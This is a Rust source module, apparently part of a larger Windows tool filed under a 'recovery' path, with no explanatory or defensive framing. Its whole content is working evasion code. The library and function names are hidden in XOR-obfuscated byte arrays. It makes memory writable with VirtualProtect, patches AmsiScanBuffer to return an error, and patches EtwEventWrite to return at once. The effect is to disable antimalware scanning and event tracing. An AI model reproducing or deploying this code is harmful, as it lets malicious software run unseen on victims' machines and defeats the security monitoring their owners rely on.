use crate::recovery::helpers::obfuscation::{deobf, deobf_w};
use crate::recovery::settings::RecoveryControl;
use tracing::{debug, info};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use windows::Win32::System::Memory::{
    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VirtualProtect,
};
use windows::core::PCWSTR;

pub fn apply_evasion_techniques() {
    if !RecoveryControl::global().evasion_enabled() {
        debug!("evasion techniques are disabled");
        return;
    }

    info!("applying evasion and stealth techniques");

    if let Err(err) = patch_amsi() {
        debug!(error = ?err, "AMSI bypass failed");
    } else {
        info!("AMSI bypass applied successfully");
    }

    if let Err(err) = patch_etw() {
        debug!(error = ?err, "ETW bypass failed");
    } else {
        info!("ETW bypass applied successfully");
    }
}

fn patch_amsi() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // "amsi.dll"
        let amsi_name = deobf_w(&[0xDC, 0xD0, 0xCE, 0xD4, 0x93, 0xD9, 0xD1, 0xD1]);
        let h_amsi = LoadLibraryW(PCWSTR(amsi_name.as_ptr()))?;
        if h_amsi.is_invalid() {
            return Err("failed to load amsi.dll".into());
        }

        // "AmsiScanBuffer"
        let func_name_str = deobf(&[
            0xFC, 0xD0, 0xCE, 0xD4, 0xEE, 0xDE, 0xDC, 0xD3, 0xFF, 0xC8, 0xDB, 0xDB, 0xD8, 0xCF,
        ]);
        let func_name = format!("{}\0", func_name_str);
        let p_amsi_scan_buffer = GetProcAddress(h_amsi, windows::core::PCSTR(func_name.as_ptr()));

        let Some(p_address) = p_amsi_scan_buffer else {
            return Err("failed to find AmsiScanBuffer address".into());
        };

        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

        apply_patch(p_address as _, &patch)
    }
}

fn patch_etw() -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        // "ntdll.dll"
        let ntdll_name = deobf_w(&[0xD3, 0xC9, 0xD9, 0xD1, 0xD1, 0x93, 0xD9, 0xD1, 0xD1]);
        let h_ntdll = LoadLibraryW(PCWSTR(ntdll_name.as_ptr()))?;
        if h_ntdll.is_invalid() {
            return Err("failed to load ntdll.dll".into());
        }

        // "EtwEventWrite"
        let func_name_str = deobf(&[
            0xF8, 0xC9, 0xCA, 0xF8, 0xCB, 0xD8, 0xD3, 0xC9, 0xEA, 0xCF, 0xD4, 0xC9, 0xD8,
        ]);
        let func_name = format!("{}\0", func_name_str);
        let p_etw_event_write = GetProcAddress(h_ntdll, windows::core::PCSTR(func_name.as_ptr()));

        let Some(p_address) = p_etw_event_write else {
            return Err("failed to find EtwEventWrite address".into());
        };

        let patch: [u8; 3] = [0x33, 0xC0, 0xC3];

        apply_patch(p_address as _, &patch)
    }
}

fn apply_patch(
    p_address: *mut std::ffi::c_void,
    patch: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let mut old_protect = PAGE_PROTECTION_FLAGS::default();
        VirtualProtect(
            p_address,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )?;

        std::ptr::copy_nonoverlapping(patch.as_ptr(), p_address as *mut u8, patch.len());

        let mut temp = PAGE_PROTECTION_FLAGS::default();
        VirtualProtect(p_address, patch.len(), old_protect, &mut temp)?;

        Ok(())
    }
}
